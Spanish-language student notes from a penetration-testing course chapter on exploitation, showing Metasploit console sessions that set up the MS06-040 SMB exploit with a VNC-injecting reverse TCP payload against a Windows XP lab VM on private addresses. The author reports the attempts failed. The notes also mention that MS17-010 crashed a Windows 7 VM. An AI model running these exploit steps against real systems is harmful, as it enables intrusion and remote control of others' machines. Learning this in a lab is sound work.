Capitulo 4   	Explotacion

Explotacion de vulnerabilidades con Metasploit

Hasta aqui hemos estado recopilando informacion


Metasploit es un fremwork de penetration , desarrollo y prubeas
de exploits o de ataques


Un exploit es una herramienta usa las herramientas de la maquina
que se esta atacando para nuestros servicios

un tema muy importante los exploits estan desarrollados para un target en especial , una servidor , un sistema operativo , etc


tenemos que configurar el servicio de postgres

root~# service postgresql start


con OpenVas creamos un task con la ip que hemos seleccionado luego de eso solo ejecutamos y el creara un reporte en la parte de
topologia miramos el reporte de las vulnuerabilidades que tiene el equipo


!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

En msf5   buscamos la vulnerabilidad que  nos dio el analisis de
openvas
    search nombre-la-vulnerabilidad

    el exploit lo que hace es aprovecharse de la caracteristica especifica encontrada en la vulnerabilidad
    el pedazo de codigo que aprovecha esa vulnerabilidad
    y despues de aprovechar la vulnerabilidad creamos una accion mas es cargar un payload
    hay una lista enorme de payloads

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@22
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Este es el resultado del tesk realizado a la maquina virtual
windows xp alojada en una mac

msf5 > search MS06-040

Matching Modules
================

   #  Name                                 Disclosure Date  Rank  Check  Description
   -  ----                                 ---------------  ----  -----  -----------
   0  exploit/windows/smb/ms06_040_netapi  2006-08-08       good  No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow



Luego usamos el exploit descrito

msf5 > use exploit/windows/smb/ms06_040_netapi
        con el comando show payloads
            la cantidad de payloads es muy grande

el ejercicio lo haremos con
        (windows/vncinject/reverse_tcp)

msf5 exploit(windows/smb/ms06_040_netapi) > set payload windows/vncinject/reverse_tcp

    payload => windows/vncinject/reverse_tcp


aqui ya lo hemos seleccionado ahora le daremos opciones
    a travez del comando show options


@@@@@@@@@@@
msf5 exploit(windows/smb/ms06_040_netapi) > show options

Module options (exploit/windows/smb/ms06_040_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/vncinject/reverse_tcp):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   AUTOVNC               true             yes       Automatically launch VNC viewer if present
   DisableCourtesyShell  true             no        Disables the Metasploit Courtesy shell
   EXITFUNC              thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                                  yes       The listen address (an interface may be specified)
   LPORT                 4444             yes       The listen port
   VNCHOST               127.0.0.1        yes       The local host to use for the VNC proxy
   VNCPORT               5900             yes       The local port to use for the VNC proxy
   ViewOnly              true             no        Runs the viewer in view mode


Exploit target:

   Id  Name
   --  ----
   0   (wcscpy) Automatic (NT 4.0, 2000 SP0-SP4, XP SP0-SP1)


!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

cada payload requiere unos parametros en particular
ahora la configuracion para cada configuracion primero
va el comando set

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
msf5 exploit(windows/smb/ms06_040_netapi) > set RHOST 192.168.1.8
RHOST => 192.168.1.8
msf5 exploit(windows/smb/ms06_040_netapi) > set LHOST 192.168.1.3
LHOST => 192.168.1.3
msf5 exploit(windows/smb/ms06_040_netapi) > show options

Module options (exploit/windows/smb/ms06_040_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.1.8      yes       The target address range or CIDR identifier
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/vncinject/reverse_tcp):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   AUTOVNC               true             yes       Automatically launch VNC viewer if present
   DisableCourtesyShell  true             no        Disables the Metasploit Courtesy shell
   EXITFUNC              thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                 192.168.1.3      yes       The listen address (an interface may be specified)
   LPORT                 4444             yes       The listen port
   VNCHOST               127.0.0.1        yes       The local host to use for the VNC proxy
   VNCPORT               5900             yes       The local port to use for the VNC proxy
   ViewOnly              true             no        Runs the viewer in view mode


Exploit target:

   Id  Name
   --  ----
   0   (wcscpy) Automatic (NT 4.0, 2000 SP0-SP4, XP SP0-SP1)


!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!

Nota :
    En este ejercicio no me pude conectar a ninguna maquina virtual
    se busco en search el codigo de vulnerabilidad
    para winXP use en MS06-040 con diferentes
    exploits y payloads y ninguno funciono bien
    ni siquiera pude entrar al sistema

    para win7 use el MS17-010
    con diferentes exploits y payloads y lo mismo no tube
    suerte pero alcontrario de winXP este sobre cargo
    el buffer y mandaba una pantalla azul y lo hacia restar

sigamos con el siguiente video quizas tenga suerte usando
    armitage

    
